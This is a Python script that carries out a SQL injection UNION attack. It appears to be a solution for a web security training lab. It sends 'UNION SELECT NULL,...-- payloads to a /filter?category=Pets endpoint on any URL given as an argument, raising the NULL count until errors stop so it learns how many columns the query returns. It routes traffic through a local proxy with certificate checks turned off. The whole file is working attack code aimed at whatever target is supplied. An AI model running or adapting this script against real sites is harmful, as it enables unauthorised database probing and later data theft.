import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())

proxies = {'http':'127.0.0.1:8080', 'https': '127.0.0.1:8080'}

#UNION attack, determining the number of columns returned by the query
#'UNION SELECT NULL,NULL,NULL--
def sqli_payload(url, max_columns=10):
	for i in range(1,max_columns+1):
		payload = "'UNION SELECT " + ",".join(["NULL"] * i) + "--"
		path = "/filter?category=Pets"
		r = requests.get(url + path + payload, proxies=proxies, verify=False)
		res = r.text
		if "Internal Server Error" not in res:
			print("Number of columns is:" + str(i))
			return i
	return False

def main():
	if len(sys.argv) != 2:
		print("Give target Url")
		print("Example: %s url" % sys.argv[0])
		sys.exit(1)

	url = sys.argv[1].strip()
	number_of_columns = sqli_payload(url)

if __name__ == '__main__':
	main()